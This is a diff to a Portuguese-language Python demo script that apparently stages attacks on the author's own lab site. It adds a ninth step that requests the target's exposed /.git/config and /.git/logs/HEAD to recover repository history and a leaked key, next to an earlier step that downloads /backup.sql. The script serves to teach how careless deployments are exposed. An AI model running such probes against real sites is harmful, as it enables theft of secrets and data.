@@ -43,7 +43,7 @@ def slow(t, d=0.012, fim="\n"):
 def titulo(n, nome):
     print()
     print(f"{D}{'─' * 64}{X}")
-    slow(f"{B}[{n}/8] {nome}{X}", 0.012)
+    slow(f"{B}[{n}/9] {nome}{X}", 0.012)
     print(f"{D}{'─' * 64}{X}")
 
 def ok(msg):
@@ -180,9 +180,23 @@ slow(f"    GET /backup.sql  →  200 OK  (dump com {n} INSERTs e senha)", 0.03)
 perigo("o banco inteiro, de graça, na pasta pública")
 time.sleep(1.0)
 
+# [9] .git exposto
+titulo(9, "HISTÓRICO DO CÓDIGO EXPOSTO · .git")
+info("pedindo a pasta do histórico do repositório...")
+time.sleep(0.7)
+s, b = req("/.git/config")
+if "url" in b or "remote" in b:
+    slow(f"    GET /.git/config  →  200 OK", 0.03)
+    perigo("o repositório inteiro (com o histórico de commits) está na internet")
+time.sleep(0.6)
+s, b = req("/.git/logs/HEAD")
+if "VIDA_AI_KEY" in b:
+    perigo("e o histórico entrega o segredo que já foi 'removido' do código")
+time.sleep(1.0)
+
 print()
 print(f"{R}{B}{'═' * 64}{X}")
-slow(f"{R}{B}  💀 8/8 FALHAS EXPLORADAS — O SITE NO AR FOI COMPROMETIDO{X}", 0.02)
+slow(f"{R}{B}  💀 9/9 FALHAS EXPLORADAS — O SITE NO AR FOI COMPROMETIDO{X}", 0.02)
 print(f"{D}  ({HOST} — lab próprio, dados fictícios){X}")
 print(f"{R}{B}{'═' * 64}{X}")
 print()
